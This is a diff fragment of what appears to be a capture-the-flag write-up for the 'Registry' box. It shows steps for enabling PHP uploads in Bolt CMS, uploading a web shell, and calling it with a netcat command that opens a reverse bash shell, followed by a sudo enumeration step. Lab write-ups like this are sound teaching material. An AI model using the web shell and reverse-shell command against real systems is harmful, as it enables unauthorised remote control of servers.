@@ -104,7 +104,9 @@ Windows has an issues with filenames containing a semicolon ( : ), so I had to r
 3.  Navigate to CONFIGURATION >> MAIN CONFIGURATION.
 4.  Add php as one of the allowed file types.    
 5.  Upload RCE php and navigate to the following: **registry.htb/bolt/files/shell.php?cmd=nc.traditional -ne /bin/bash 127.0.0.1 1337**
+
 ![](images/ncReverse.png)
+
 7.  sudo -l and notice:
 
 >     User www-data may run the following commands on bolt:
